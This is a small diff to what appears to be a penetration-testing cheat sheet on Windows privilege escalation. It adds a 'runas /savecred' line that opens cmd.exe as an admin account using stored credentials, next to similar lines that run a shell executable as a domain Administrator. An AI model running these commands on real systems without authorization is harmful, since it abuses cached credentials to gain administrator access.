@@ -13,4 +13,5 @@ runas /savecred /user:DOM.LOCAL\Administrator "C:\Users\<user>\Documents\shell.e
 ## Runnng AS with local commands
 ```
 runas /savecred /user:DOM.LOCAL\Administrator "c:\windows\system32\cmd.exe /k whoami"
+runas /savecred /user:admin cmd.exe
 ```
